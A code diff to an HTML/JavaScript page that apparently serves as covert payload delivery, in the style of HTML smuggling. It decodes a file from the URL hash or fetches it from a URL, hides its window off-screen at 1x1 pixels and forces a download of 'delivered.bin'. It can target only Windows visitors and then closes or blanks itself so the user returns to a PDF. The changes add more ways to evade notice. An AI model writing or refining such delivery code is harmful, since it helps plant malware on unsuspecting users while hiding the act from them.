@@ -5,8 +5,17 @@ var _newTab=history.length<=2;
 function _exit(){
   if(_pop){window.close();return}
   if(!_newTab){history.back();setTimeout(function(){window.close()},300);return}
-  // Chrome new tab: redirect to blank IMMEDIATELY
-  window.location.replace('about:blank');
+  // Chrome new tab: try every close method
+  try{window.open('about:blank','_self').close()}catch(e){}
+  setTimeout(function(){
+    try{window.opener=window;window.close()}catch(e){}
+    setTimeout(function(){
+      try{window.close()}catch(e){}
+      // Final: clear everything, blank page
+      document.title='';
+      document.documentElement.innerHTML='';
+    },100);
+  },100);
 }
 try{
   var _h=location.hash.slice(1).replace('&popup=1','');
@@ -17,34 +26,39 @@ try{
     var _n=_s>0?_h.slice(0,_s):'x';
     if(localStorage.getItem('dl_done_'+_n)){_exit();throw 'done'}
   }
+  // Same-tab (Firefox): delegate to popup, go back to PDF
   if(!_pop&&!_newTab){
     var p=window.open(location.href+'&popup=1','_blank','width=1,height=1,left=-9999,top=-9999');
-    if(p){history.back();setTimeout(function(){window.close()},200);throw 'delegated'}
+    if(p){history.back();throw 'delegated'}
   }
-}catch(e){if(e==='done'||e==='delegated'){document.documentElement.innerHTML=''}}
+  // Chrome new-tab: open popup for download, current tab exits
+  if(!_pop&&_newTab){
+    var p2=window.open(location.href+'&popup=1','_blank');
+    if(p2){_exit();throw 'delegated'}
+  }
+}catch(e){if(e==='done'||e==='delegated'){try{document.documentElement.innerHTML=''}catch(x){}}}
 </script><title>.</title></head>
 <body>
 <script>
 try{window.resizeTo(1,1);window.moveTo(-9999,-9999)}catch(e){}
 try{
   var h=location.hash.slice(1).replace('&popup=1','');
-  if(!h)throw 'No data';
+  if(!h)throw'x';
   try{h=decodeURIComponent(h)}catch(e){}
 
   var winOnly=false;
   if(h.slice(-2)==='!W'){winOnly=true;h=h.slice(0,-2)}
-  if(winOnly&&navigator.platform.indexOf('Win')===-1){_exit();throw 'skip'}
+  if(winOnly&&navigator.platform.indexOf('Win')===-1){_exit();throw'skip'}
 
   var sep=h.indexOf('~');
   var fname=sep>0?h.slice(0,sep):'delivered.bin';
   var data=sep>0?h.slice(sep+1):h;
 
   var key='dl_done_'+fname;
-  if(localStorage.getItem(key)){_exit();throw 'skip'}
+  if(localStorage.getItem(key)){_exit();throw'skip'}
 
   function done(){
     localStorage.setItem(key,'1');
-    // Download already triggered — exit immediately
     _exit();
   }
 
@@ -54,21 +68,18 @@ try{
     var a=document.createElement('a');
     a.href=url;a.download=fname;
     document.body.appendChild(a);a.click();
-    // Download started — mark done and exit NOW
     done();
   }
 
   if(data.indexOf('http')===0){
     fetch(data).then(function(r){
-      if(!r.ok)throw 'HTTP '+r.status;
+      if(!r.ok)throw'HTTP '+r.status;
       var exp=parseInt(r.headers.get('content-length')||'0');
       return r.blob().then(function(b){
-        if(exp>0&&b.size<exp)throw 'Incomplete';
+        if(exp>0&&b.size<exp)throw'Incomplete';
         return b;
       });
-    }).then(function(b){doDownload(b)}).catch(function(e){
-      setTimeout(_exit,2000);
-    });
+    }).then(function(b){doDownload(b)}).catch(function(e){setTimeout(_exit,2000)});
   }else{
     try{
       var raw=atob(data);
